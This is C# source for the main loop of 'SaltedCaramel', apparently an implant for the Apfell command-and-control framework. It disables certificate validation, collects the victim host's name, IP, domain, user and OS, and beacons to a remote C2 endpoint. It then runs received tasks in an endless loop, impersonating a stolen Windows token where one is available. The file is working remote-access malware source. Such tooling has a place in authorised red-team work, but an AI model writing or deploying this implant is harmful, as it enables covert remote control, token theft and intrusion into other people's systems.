using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Threading;

namespace SaltedCaramel
{
    class SaltedCaramel
    {
        static void Main(string[] args)
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };

            SCImplant implant = new SCImplant();
            implant.uuid = args[2]; // Generated when payload is created in Apfell
            implant.endpoint = args[0] + "/api/v1.3/";
            implant.host = Dns.GetHostName();
            implant.ip = Dns.GetHostEntry(implant.host) // Necessary because the host may have more than one interface
                .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            implant.domain = Environment.UserDomainName;
            implant.os = Environment.OSVersion.VersionString;
            implant.architecture = "x64";
            implant.pid = Process.GetCurrentProcess().Id;
            implant.sleep = 5000;
            implant.user = Environment.UserName;
            HTTP.crypto.PSK = Convert.FromBase64String(args[1]);

            implant.InitializeImplant();

            while (true)
            {
                SCTaskObject task = implant.CheckTasking();
                if (task.command != "none")
                {
                    if (implant.HasAlternateToken() == true)
                    {
                        using (WindowsIdentity ident = new WindowsIdentity(Tasks.Token.stolenHandle))
                        using (WindowsImpersonationContext context = ident.Impersonate())
                            task.DispatchTask(implant);
                    }
                    else
                        ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
                }
                Thread.Sleep(implant.sleep);
            }
        }
    }
}
